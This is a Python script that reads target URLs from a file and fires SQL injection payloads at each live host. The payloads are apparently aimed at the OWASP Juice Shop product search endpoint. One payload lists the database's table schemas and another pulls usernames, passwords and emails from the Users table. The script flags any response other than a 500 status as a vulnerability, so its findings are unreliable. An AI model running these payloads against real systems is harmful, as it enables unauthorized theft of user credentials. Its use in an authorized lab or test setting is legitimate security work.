import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


class VulnerabilityScanner:
    def __init__(self):
        self.targets = []

    def check_sql_injection(self, url):
        payloads = [
            "/rest/products/search?q=%27))+order%20by%201%20--",
            "/rest/products/search?q=%27))+union%20select%201,2,sql,4,5,6,7,8,sql%20from%20sqlite_master%20where%20type=%27table%27--",
            "/rest/products/search?q=%27))+union%20select%20id,username,password,email,5,6,7,8,9%20from%20Users%20%20--"
        ]
        test_urls = [f"{url}{payload}" for payload in payloads]
        responses = [requests.get(test_url) for test_url in test_urls]
        for test_url, response in zip(test_urls, responses):
            if response.status_code != 500:
                logging.info(f"SQL Injection vulnerability found at {test_url}")
                return
        logging.info(f"No SQL Injection vulnerability found at {url}")

    def check_url_live(self, url):
        try:
            if not url.startswith("http://") and not url.startswith("https://"):
                url = f"http://{url}"
            response = requests.get(url)
            if response.status_code == 200:
                logging.info(f"{url} is alive!")
                self.check_sql_injection(url)
            else:
                logging.warning(f"{url} is not reachable. Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Error accessing {url}: {e}")
        except Exception as e:
            logging.error(f"Unexpected error accessing {url}: {e}")

    def scan(self, urls):
        with ThreadPoolExecutor(max_workers=5) as executor:
            future_to_url = {executor.submit(self.check_url_live, url): url for url in urls}
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    future.result()
                except requests.exceptions.RequestException as e:
                    logging.error(f"{url} generated a request exception: {e}")
                except Exception as e:
                    logging.error(f"{url} generated an unexpected exception: {e}")

    @staticmethod
    def read_urls_from_file(filename):
        try:
            with open(filename, 'r') as file:
                return [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            logging.error(f"File {filename} not found.")
            return []
        except PermissionError:
            logging.error(f"Permission denied to read file {filename}.")
            return []

    @staticmethod
    def process_url(url):
        from urllib.parse import urlparse
        parsed_url = urlparse(url)
        netloc = parsed_url.netloc
        if parsed_url.path and '/#/' in parsed_url.path:
            path = parsed_url.path.split('/#/')[0]
        else:
            path = parsed_url.path
        return f"{netloc}{path}"


if __name__ == "__main__":
    filename = "urls.txt"
    urls = VulnerabilityScanner.read_urls_from_file(filename)
    if urls:
        scanner = VulnerabilityScanner()
        scanner.scan(urls)
    else:
        logging.warning("No valid URLs found in the file.")